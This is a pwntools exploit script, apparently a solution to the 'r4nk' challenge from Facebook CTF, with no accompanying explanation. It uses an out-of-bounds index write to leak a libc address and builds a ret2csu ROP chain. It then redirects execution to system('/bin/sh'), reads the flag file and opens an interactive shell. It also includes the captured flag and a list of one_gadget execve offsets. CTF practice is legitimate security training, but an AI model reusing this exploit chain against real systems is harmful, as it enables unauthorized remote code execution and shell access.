from pwn import *
def cmd(n):
	p.sendlineafter("> ",str(n))
def show():
	cmd(1)
def rank(idx,r):
	cmd(2)
	cmd(idx)
	cmd(r)
def cal(n):
	return (n-0x000000000602080)/8
rdi=0x0000000000400b43
rsi=0x0000000000400b41
read=0x0000000004005F0
exit=0x000000000400630
gene=0x000000000400B3A
do_call=0x000000000400B20
context.log_level='debug'
libc=ELF("./libc-2.27.so")
p=process('./r4nk')
#p=remote("challenges.fbctf.com",1339)
rank(0,cal(0x00000000004004D8))
show()
p.readuntil("0. ")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7af4140-0x7ffff79e4000)
log.warning(hex(base))
raw_input()
one=base+0x4f2c5
#gdb.attach(p,'b *0x000000000400ACD')

#flag{wH0_n33ds_pop_rdx_4NYw4y}


rank(17,gene)
rank(18,0)#rbx
rank(19,1)#rbp
rank(20,0x000000000602030)#r12
rank(21,0x0)#r13
rank(22,0x000000000602050)#14
rank(23,0x10)#15
rank(24,do_call)
rank(32,rdi)
rank(33,0x000000000602050+8)
rank(34,exit)


cmd(3)
p.send(p64(libc.sym['system']+base)+"/bin/sh\x00")

sleep(1)
p.sendline("cat /home/r4nk/flag")
p.interactive()
'''
0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
